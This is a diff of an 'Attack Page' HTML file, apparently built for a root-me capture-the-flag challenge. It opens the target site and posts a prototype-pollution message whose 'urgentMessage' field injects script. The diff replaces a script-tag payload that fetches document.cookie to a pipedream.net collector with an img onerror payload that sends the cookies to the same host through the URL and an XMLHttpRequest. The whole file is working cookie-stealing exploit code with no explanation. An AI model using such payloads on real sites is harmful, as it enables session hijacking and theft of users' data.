@@ -6,21 +6,14 @@
 <body>
     <h1>Attack Page</h1>
     <script>
-        window.onload = function() {
+       window.onload = function() {
             const target = window.open('http://node2.challenges.ctf20k.root-me.org:36975/');
 
             setTimeout(() => {
-               
                 target.postMessage(`
                     {
                         "__proto__":{
-                            "urgentMessage":"<script>
-                                fetch('https://eotqkw100h253ph.m.pipedream.net', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({cookies: document.cookie})
-                                });
-                            </script>"
+                            "urgentMessage":"<img src='https://eotqkw100h253ph.m.pipedream.net?cookies=' + encodeURIComponent(document.cookie) onerror='this.onerror=null;var xhr=new XMLHttpRequest();xhr.open(\"POST\", \"https://eotqkw100h253ph.m.pipedream.net\", true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");xhr.send(\"cookies=\"+encodeURIComponent(document.cookie));' />"
                         }
                     }
                 `, '*');
